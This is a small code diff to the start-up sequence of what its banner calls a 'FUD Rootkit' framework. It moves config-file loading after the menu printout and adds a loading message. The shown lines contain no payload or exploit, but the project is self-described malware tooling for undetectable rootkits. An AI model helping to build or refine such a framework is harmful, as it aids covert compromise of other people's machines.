@@ -42,16 +42,17 @@ Note: If you already have a rootkit, you can just use listener. You dont need to
 
 message = '     Enjoy Your FUD Rootkit ;)\n '
 
-time.sleep(2)
-config = ConfigParser()
-config.read(r'config.ini')
-
 print(banner)
 time.sleep(0.3)
 print(options)
 time.sleep(0.3)
 print(message)
 time.sleep(0.3)
+print('\n [?] Loading Framework...')
+
+time.sleep(2)
+config = ConfigParser()
+config.read(r'config.ini')
 
 while True:
     selection = input('MJv3.11 >>> ')
